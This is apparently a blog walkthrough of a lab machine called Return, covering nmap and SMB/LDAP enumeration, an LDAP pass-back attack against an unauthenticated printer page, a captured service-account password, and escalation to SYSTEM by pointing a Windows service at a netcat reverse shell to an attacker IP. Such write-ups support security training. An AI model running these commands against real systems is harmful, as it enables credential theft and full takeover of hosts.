---
title: 'Return Machine Walkthrough'
keywords: []
layout: single
header:
  image: /assets/images/Love.png
toc: true
toc_label: "Table of Contents"
sidebar:
  nav: "sidebar"
---

![](C:\Users\Liwei\Downloads\medium-export-278649ace7c60a598caa62c8d4e8711680997ae92f7b6c3a6e3c9c4fd19b812a\posts\md_1740363296828\img\1__slwGE7irikiTNL8CDKE46A.png)

### Summary

Return is an easy machine running the Microsoft Windows operation system. The machine shows how security misconfigurations in peripheral devices, such as printers, can be exploited to gain elevated root user access privileges.

As a result of no user authentication being in place on the network printer administration page, unauthorized access was gained to the backend printer administration interface. Using a [LDAP pass back attack](https://chrollo-dll.gitbook.io/chrollo/security-blogs/active-directory-security/ad-enumeration-techniques/ldap-bind-credentials-ad-credential-hunting), a malicious LDAP server was substituted from which cached credentials for the **svc-printer** service account in Active Directory was obtained. The credentials were used to remotely log in to the machine as the svc-printer service account and upload the net cat network tool.

It was discovered that the svc-printer service account user had elevated privileges and could control the services running on the machine. As a result, the executable binary of a privileged service was changed to point to net cat tool and the service restarted, granting a shell as **NT Authority\\System**

### **Step 1 — Enumeration**

As always, I begin with enumeration of the victim machine with the goal of gathering as much information as I can about it such as open ports, services running on the open ports, and operating system type and version. I will use the network scanner, **nmap.**

#### Enumerating with nmap

I first run a scan to discover open ports and then run the default set of nmap enumeration scripts and service detection scan only on those open ports for greater efficiency. Explanation of flags:

*   \-p — Ports on victim machine to scan
*   \-n — Do not resolve DNS
*   \-sC — run default set of nmap enumeration scripts
*   \-sV — Detect services running on the open ports
*   \-T4 — Scan in aggressive mode to speed up the scan results

nmap 10.10.11.108 -p- -T4

nmap 10.10.11.108 -p 53,80,135,139,389,445,464,593,636,3268-3269,5985,9389,47001,49664-49666,49668,49671,49674-49675,49678,49681,49697,59240 -sC, sV, -n -T4

![](C:\Users\Liwei\Downloads\medium-export-278649ace7c60a598caa62c8d4e8711680997ae92f7b6c3a6e3c9c4fd19b812a\posts\md_1740363296828\img\1__2o1m3zwSf5SeFO62ZDpm__Q.png)
![](C:\Users\Liwei\Downloads\medium-export-278649ace7c60a598caa62c8d4e8711680997ae92f7b6c3a6e3c9c4fd19b812a\posts\md_1740363296828\img\1__YTpcJJOxtWFuGfZBgYEwHg.png)

The nmap output show that the machine is running Microsoft Windows OS and mostly likely is a domain controller due to the types of ports open and the services running on those ports. The results show the following:

*   Dynamic name resolution (DNS) service running on default port of 53.
*   Web server running IIS version 10 is running on default port 80
*   Kerberos authentication protocol is running on default port 88.
*   Remote procedure call (RPC) service running on default port 135
*   Server messaging block (SMB) for network resource sharing is running on default port of 445 and also on port 139 via the NetBios service
*   Lightweight directory access protocol (LDAP) is active on default port 389 and port 3268 for running the Global Catalog service
*   Windows remote management (WinRM) service over HTTP is active on default port of 5985.

#### Enumerating SMB files shares on ports 139 and 445

I try to enumerate the SMB shares for useful information and although successfully login as anonymous user, receive an error. Explanation of flags:

*   \-p — Specify the ports to connect on
*   \-N — Login without a password
*   \-L — List all shares on the machine

smbclient -N -L \\\\10.10.11.108

![](C:\Users\Liwei\Downloads\medium-export-278649ace7c60a598caa62c8d4e8711680997ae92f7b6c3a6e3c9c4fd19b812a\posts\md_1740363296828\img\1__sa3NerqbDfgeQoc2Lxhuug.png)

#### Enumerating LDAP Directory

As I have no credentials at the moment, I will try to login to LDAP server anonymously via the **ldapsearch** tool, which fails as null sessions without credentials are not accepted. Explanation of flags:

*   \-x — use simple authentication method for LDAP bind request
*   \-H — Specify the IP address of the host machine to connect to

ldapsearch -x -H ldap://10.10.11.108

![](C:\Users\Liwei\Downloads\medium-export-278649ace7c60a598caa62c8d4e8711680997ae92f7b6c3a6e3c9c4fd19b812a\posts\md_1740363296828\img\1__qC1OaKSyifeP3xddD__6OEQ.png)

#### Enumerating web server via port 80

When I visit the web page [**http://10.10.11.108**](http://10.10.11.108) in the browser, I am presented with a page that appears to be the administration interface of a network printer. It is important to note that **absolutely no user authentication of any kind is in place** to prevent unauthorized access to this resource. Upon visiting the **Settings** tab, a form displaying the configuration settings of the printer network account, **svc-printer**, appears.

I decided to test using Burp Proxy within BurpSuite which form parameters are being passed in the client request upon request to update the configuration information. Per the screenshot below, only the **IP** parameter (server address label) is being passed. This immediately made me think a LDAP pass back attack, in which the victim’s machine authenticates against a malicious LDAP server controlled by the attacker, is the way to attack which I use in the next step after enumeration

![](C:\Users\Liwei\Downloads\medium-export-278649ace7c60a598caa62c8d4e8711680997ae92f7b6c3a6e3c9c4fd19b812a\posts\md_1740363296828\img\1____kC0gHOjVyw0A2Lsua78pQ.png)

### Step 2 — Gaining Initial Foothold as svc-printer user

#### Completing a LDAP pass back attack

I use a LDAP pass back attack following the below steps. The attack was successful, revealing the password of the svc-printer service account.

*   Substitute the IP address of my Kali Linux attacking machine for the legitimate LDAP server address of **printer.return.local**.
*   Set up a net cat listener on my machine to catch the LDAP connection (bind request) from the victim’s machine.
*   Update the configuration of the svc-printer account which will initiate a LDAP request from victim machine to my malicious LDAP server.

Explanation of flags used in setting up net cat listener is shown below along with details of the successful LDAP bind request from Wireshark.

*   \-l — Set net cat to listening mode
*   \-v — Enable verbose mode for extra information
*   \-n — Disable DNS resolution
*   \-p — Specify port to listen on — **Must be 389 as this is a LDAP connection**

nc -lvnp 389

![](C:\Users\Liwei\Downloads\medium-export-278649ace7c60a598caa62c8d4e8711680997ae92f7b6c3a6e3c9c4fd19b812a\posts\md_1740363296828\img\1__1yzKx180A3zC24JbRp94Sg.png)

![](C:\Users\Liwei\Downloads\medium-export-278649ace7c60a598caa62c8d4e8711680997ae92f7b6c3a6e3c9c4fd19b812a\posts\md_1740363296828\img\1__FTzdoBGGi7Knn3vWxt8G4w.png)

#### Remotely logging in as svc-printer service account user

As nmap scan results showed port 5985 is open, I use the **evil-winrm tool** to remotely log in to the victim’s machine as svc-printer and was successful. Explanation of flags:

*   \-i — Specify the IP address of victim’s machine to connect to
*   \-u — Specify the username of the victim’s account
*   \-p — Specify the password of the victim’s account

evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'

![](C:\Users\Liwei\Downloads\medium-export-278649ace7c60a598caa62c8d4e8711680997ae92f7b6c3a6e3c9c4fd19b812a\posts\md_1740363296828\img\1__nD18BckP9NyG__uGHeI9bug.png)

### **Step 3 — Privilege Escalation to NT Authority\\System**

#### Enumerating svc-printer access privileges

After remotely logging as svc-printer service account user, I enumerate the privileges of this user account, both privileges assigned through AD security group membership and assigned individually via command **whoami /all**.

![](C:\Users\Liwei\Downloads\medium-export-278649ace7c60a598caa62c8d4e8711680997ae92f7b6c3a6e3c9c4fd19b812a\posts\md_1740363296828\img\1__33If3WCUPlI9hnhyISiI__w.png)

![](C:\Users\Liwei\Downloads\medium-export-278649ace7c60a598caa62c8d4e8711680997ae92f7b6c3a6e3c9c4fd19b812a\posts\md_1740363296828\img\1__g6xrEnARnOOC0aEfBRUiDw.png)

#### Privilege escalation — Service binary manipulation

The service account svc-printer is a member of the **server operators** AD security group which means I can control the various services on the victim’s machine. I abuse the privilege via the following steps and was successful, obtaining a reverse shell as **NT Authority\\System.**

*   Upload the net cat binary executable (nc.exe) from my machine to the victim’s machine
*   Change the service binary of a **privileged** service to point to command prompt application (**cmd.exe**) and have it start net cat on any available port. This is to avoid reverse shell instability due net cat not meeting full requirements for a service binary executable. I will be using the **VGAuthService** service.
*   Config a net cat listener on my Kali Linux attacking machine to listen on the port selected previous step
*   Restart the aformentioned service and catch the elevated reverse shell.

Explanation of several parts of the command statement to change service binary executable to net cat is listed below. Refer to the **Figure 14**.

*   cmd /c — Start the native Windows command prompt, execute the program provided as input to /c , and then exit command prompt
*   \-e — Flag to tell netcat to execute a program on victim’s machine upon successful reverse shell connection (in this case the command prompt)

upload /Desktop/nc.exe

![](C:\Users\Liwei\Downloads\medium-export-278649ace7c60a598caa62c8d4e8711680997ae92f7b6c3a6e3c9c4fd19b812a\posts\md_1740363296828\img\1__q__D7xYWqpIwOURuU__Zlrxg.png)
![](C:\Users\Liwei\Downloads\medium-export-278649ace7c60a598caa62c8d4e8711680997ae92f7b6c3a6e3c9c4fd19b812a\posts\md_1740363296828\img\1__fHBzxtWDza__420xxS__JStQ.png)

sc.exe config VGAuthService binpath="C:\\windows\\system32\\cmd.exe /c C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd 10.10.14.2 4444"

![](C:\Users\Liwei\Downloads\medium-export-278649ace7c60a598caa62c8d4e8711680997ae92f7b6c3a6e3c9c4fd19b812a\posts\md_1740363296828\img\1__i2casPYDRBczzo9z6sh6hQ.png)

sc.exe stop VGAuthService

sc.exe start VGAuthService

![](C:\Users\Liwei\Downloads\medium-export-278649ace7c60a598caa62c8d4e8711680997ae92f7b6c3a6e3c9c4fd19b812a\posts\md_1740363296828\img\1__E5fJv41rZNQdOOSyLziwMQ.png)

![](C:\Users\Liwei\Downloads\medium-export-278649ace7c60a598caa62c8d4e8711680997ae92f7b6c3a6e3c9c4fd19b812a\posts\md_1740363296828\img\1__13mSVQf7OJHUZjA1jNGJxQ.png)

### Vulnerability Summary

This machine contained the following vulnerabilities:

*   **Broken Access Control** — As a result of no user authentication control on the network printer administrative interface page, I was able to access the settings page and substitute a malicious LDAP server address to begin the LDAP pass back attack
*   **Security misconfiguration** — As a result of the service account, **svc-printer** belonging to the privileged security group, **server operators**, I was able to change the service executable binary for a privileged service to the malicious net cat executable in lieu.